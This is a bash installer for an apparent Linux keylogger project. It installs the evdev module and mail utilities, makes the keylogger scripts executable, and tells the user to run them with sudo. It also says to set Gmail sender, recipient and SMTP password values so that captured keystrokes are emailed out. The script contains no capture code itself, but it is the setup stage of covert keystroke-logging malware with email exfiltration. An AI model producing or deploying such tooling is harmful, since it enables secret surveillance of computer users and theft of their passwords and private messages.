#!/bin/bash
# Installation script for Linux Keylogger Project

echo "================================================================"
echo "  Linux Keylogger - Installation Script"
echo "================================================================"

# Update package list
echo "[*] Updating package list..."
sudo apt-get update

# Install Python and pip
echo "[*] Installing Python3 and pip..."
sudo apt-get install -y python3 python3-pip python3-venv

# Install evdev module
echo "[*] Installing evdev module..."
pip3 install evdev

# Install email utilities (fallback)
echo "[*] Installing email utilities..."
sudo apt-get install -y mailutils mutt

# Install additional tools
echo "[*] Installing additional tools..."
sudo apt-get install -y hexdump evtest

# Make scripts executable
echo "[*] Making scripts executable..."
chmod +x keylogger.py 2>/dev/null || true
chmod +x keylogger.sh 2>/dev/null || true
chmod +x test_keylogger.py 2>/dev/null || true

echo "[*] Installation complete!"
echo ""
echo "To test the keylogger:"
echo "  sudo python3 test_keylogger.py"
echo ""
echo "To run the keylogger:"
echo "  sudo python3 keylogger.py"
echo "  OR"
echo "  sudo ./keylogger.sh start"
echo ""
echo "Make sure to edit the email configuration in keylogger.py"
echo "  - EMAIL_RECIPIENT: your_email@gmail.com"
echo "  - EMAIL_SENDER: your_email@gmail.com"
echo "  - SMTP_PASSWORD: your_app_password (for Gmail)"
echo "================================================================"
